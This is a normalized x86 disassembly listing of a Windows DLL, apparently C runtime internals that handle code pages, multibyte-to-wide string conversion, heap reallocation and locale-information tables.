jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1001a9b0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1002241c
push 0xc
push r--data
call sub_10020070
call sub_1001e316
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100224b7
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_100200b5
retn
push 0x20
call sub_1001ede7
cmp esi rw-data
je r-xdata
push esi
call sub_1001a3eb
pop ecx
sub_100224c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1002253c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_100224c0
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10022228
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1001a9b0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_100221f9
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_1002228c
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1001a9b0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_100221f9
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10022725
push 0x14
push r--data
call sub_10020070
or [ ebp - 0x20 ] 0xffffffff
call sub_1001e316
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1002241c
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_100224c0
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1001bcbc
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_100200b5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1002253c
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1001a3eb
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1001a3eb
pop ecx
push 0xd
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022886
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1001a3eb
pop ecx
sub_1002290c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1001b46f
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1002769e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10022aab
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100229c4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1001a809
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1001a9b0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1001b44f
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1001aa2a
pop ecx
cmp eax ebx
je r-xdata
call sub_100228e0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10022aab
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100229c4
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10022aeb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1001aa2a
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001a3eb
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1001e841
pop ecx
call sub_1001bddd
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_1001bddd
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001bd9b
pop ecx
mov [ esi ] eax
push esi
call sub_1001e841
pop ecx
test eax eax
je r-xdata
call sub_1001bddd
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001bd9b
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_10022b98
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_1001df79
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001df79
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001df79
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001df79
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_10023397
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1001a3eb
push [ esi + 0x8 ]
call sub_1001a3eb
push [ esi + 0xc ]
call sub_1001a3eb
push [ esi + 0x10 ]
call sub_1001a3eb
push [ esi + 0x14 ]
call sub_1001a3eb
push [ esi + 0x18 ]
call sub_1001a3eb
push [ esi ]
call sub_1001a3eb
push [ esi + 0x20 ]
call sub_1001a3eb
push [ esi + 0x24 ]
call sub_1001a3eb
push [ esi + 0x28 ]
call sub_1001a3eb
push [ esi + 0x2c ]
call sub_1001a3eb
push [ esi + 0x30 ]
call sub_1001a3eb
push [ esi + 0x34 ]
call sub_1001a3eb
push [ esi + 0x1c ]
call sub_1001a3eb
push [ esi + 0x38 ]
call sub_1001a3eb
push [ esi + 0x3c ]
call sub_1001a3eb
add esp 0x40
push [ esi + 0x40 ]
call sub_1001a3eb
push [ esi + 0x44 ]
call sub_1001a3eb
push [ esi + 0x48 ]
call sub_1001a3eb
push [ esi + 0x4c ]
call sub_1001a3eb
push [ esi + 0x50 ]
call sub_1001a3eb
push [ esi + 0x54 ]
call sub_1001a3eb
push [ esi + 0x58 ]
call sub_1001a3eb
push [ esi + 0x5c ]
call sub_1001a3eb
push [ esi + 0x60 ]
call sub_1001a3eb
push [ esi + 0x64 ]
call sub_1001a3eb
push [ esi + 0x68 ]
call sub_1001a3eb
push [ esi + 0x6c ]
call sub_1001a3eb
push [ esi + 0x70 ]
call sub_1001a3eb
push [ esi + 0x74 ]
call sub_1001a3eb
push [ esi + 0x78 ]
call sub_1001a3eb
push [ esi + 0x7c ]
call sub_1001a3eb
add esp 0x40
push [ esi + 0x80 ]
call sub_1001a3eb
push [ esi + 0x84 ]
call sub_1001a3eb
push [ esi + 0x88 ]
call sub_1001a3eb
push [ esi + 0x8c ]
call sub_1001a3eb
push [ esi + 0x90 ]
call sub_1001a3eb
push [ esi + 0x94 ]
call sub_1001a3eb
push [ esi + 0x98 ]
call sub_1001a3eb
push [ esi + 0x9c ]
call sub_1001a3eb
push [ esi + 0xa0 ]
call sub_1001a3eb
push [ esi + 0xa4 ]
call sub_1001a3eb
push [ esi + 0xa8 ]
call sub_1001a3eb
push [ esi + 0xbc ]
